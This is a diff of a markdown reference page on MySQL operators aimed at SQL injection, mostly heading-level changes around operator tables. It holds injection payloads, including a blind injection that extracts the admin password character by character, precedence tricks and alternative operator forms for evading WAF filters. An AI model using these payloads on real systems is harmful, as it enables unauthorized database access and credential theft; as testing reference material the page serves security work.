@@ -7,11 +7,9 @@ tags: ["operators", "comparison", "logical", "reference"]
 lastUpdated: 2025-03-15
 ---
 
-## Operators
-
 Understanding MySQL operators is essential for crafting effective SQL injection payloads. This reference covers the most useful operators for SQL injection techniques.
 
-### Comparison Operators
+## Comparison Operators
 
 | Operator      | Description           | Example                                             |
 | ------------- | --------------------- | --------------------------------------------------- |
@@ -33,7 +31,7 @@ Understanding MySQL operators is essential for crafting effective SQL injection 
 | `SOUNDS LIKE` | Phonetic comparison   | `SELECT * FROM users WHERE name SOUNDS LIKE 'john'` |
 | `IN`          | In set                | `SELECT * FROM users WHERE id IN (1,2,3)`           |
 
-### Logical Operators
+## Logical Operators
 
 | Operator       | Description | Example                                              |
 | -------------- | ----------- | ---------------------------------------------------- |
@@ -42,7 +40,7 @@ Understanding MySQL operators is essential for crafting effective SQL injection 
 | `NOT` or `!`   | Logical NOT | `SELECT * FROM users WHERE NOT id=1`                 |
 | `XOR`          | Logical XOR | `SELECT * FROM users WHERE id=1 XOR admin=1`         |
 
-### Mathematical Operators
+## Mathematical Operators
 
 | Operator     | Description      | Example                      |
 | ------------ | ---------------- | ---------------------------- |
@@ -53,7 +51,7 @@ Understanding MySQL operators is essential for crafting effective SQL injection 
 | `DIV`        | Integer division | `SELECT id DIV 2 FROM users` |
 | `%` or `MOD` | Modulo           | `SELECT id % 2 FROM users`   |
 
-### Bitwise Operators
+## Bitwise Operators
 
 | Operator | Description | Example                     |
 | -------- | ----------- | --------------------------- |
@@ -64,22 +62,22 @@ Understanding MySQL operators is essential for crafting effective SQL injection 
 | `>>`     | Right shift | `SELECT 4 >> 2` (returns 1) |
 | `~`      | Bitwise NOT | `SELECT ~1` (returns -2)    |
 
-### Assignment Operators
+## Assignment Operators
 
 | Operator | Description      | Example         |
 | -------- | ---------------- | --------------- |
 | `:=`     | Value assignment | `SET @var := 1` |
 
-### String Operators
+## String Operators
 
 | Operator      | Description                  | Example                                                  |
 | ------------- | ---------------------------- | -------------------------------------------------------- |
 | `CONCAT()`    | String concatenation         | `SELECT CONCAT(first_name, ' ', last_name) FROM users`   |
 | `CONCAT_WS()` | Concatenation with separator | `SELECT CONCAT_WS('-', 'a', 'b', 'c')` (returns 'a-b-c') |
 
-### Usage in SQL Injection
+## Usage in SQL Injection
 
-#### Boolean-Based Blind Injection
+### Boolean-Based Blind Injection
 
 ```sql
 -- Testing if admin exists
@@ -89,7 +87,7 @@ Understanding MySQL operators is essential for crafting effective SQL injection 
 ' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97 -- -
 ```
 
-#### Operator Precedence Exploitation
+### Operator Precedence Exploitation
 
 Operators follow a precedence order that can be exploited:
 
@@ -102,7 +100,7 @@ Operators follow a precedence order that can be exploited:
 (1=0 OR 1=1) AND 2=2 -- True
 ```
 
-#### Alternative Operator Forms
+### Alternative Operator Forms
 
 Using alternative forms can help bypass WAF filters:
 
@@ -114,7 +112,7 @@ SELECT * FROM users WHERE id=1 OR username='admin'
 SELECT * FROM users WHERE id=1 || username='admin'
 ```
 
-#### Practical Examples in Injections
+### Practical Examples in Injections
 
 ```sql
 -- Using NOT to invert conditions
@@ -130,7 +128,7 @@ SELECT * FROM users WHERE id=1 || username='admin'
 ' OR id BETWEEN 1 AND 5 -- -
 ```
 
-### Truth Table for Logical Operators
+## Truth Table for Logical Operators
 
 | Expr1 | Expr2 | AND   | OR    | XOR   |
 | ----- | ----- | ----- | ----- | ----- |
@@ -144,7 +142,7 @@ SELECT * FROM users WHERE id=1 || username='admin'
 | NULL  | FALSE | FALSE | NULL  | NULL  |
 | NULL  | NULL  | NULL  | NULL  | NULL  |
 
-### Operator Precedence in MySQL
+## Operator Precedence in MySQL
 
 From highest to lowest:
 
